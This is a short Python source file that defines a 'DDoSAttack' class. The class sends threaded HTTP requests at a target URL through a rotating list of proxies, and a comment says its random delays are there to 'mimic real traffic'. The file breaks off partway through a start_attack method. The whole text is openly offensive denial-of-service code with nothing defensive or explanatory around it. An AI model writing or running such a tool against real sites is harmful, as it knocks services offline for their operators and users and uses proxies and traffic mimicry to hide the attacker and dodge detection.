import requests
import random
import threading
import time

class DDoSAttack:
    def __init__(self, target_url, proxy_list):
        self.target_url = target_url
        self.proxy_list = proxy_list

    def send_request(self, proxy):
        """
        Send a request through the proxy to the target.
        """
        proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
        try:
            response = requests.get(self.target_url, proxies=proxies)
            print(f"Sent request through {proxy} - Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request through {proxy}: {e}")

    def attack(self):
        """
        Launch DDoS attack using multiple threads and proxies.
        """
        print(f"Launching DDoS attack on {self.target_url}")
        threads = []
        for proxy in self.proxy_list:
            thread = threading.Thread(target=self.send_request, args=(proxy,))
            threads.append(thread)
            thread.start()
            time.sleep(random.uniform(0.1, 0.5))  # Random delay to mimic real traffic

        for thread in threads:
            thread.join()

    def start_attack(self):
        """
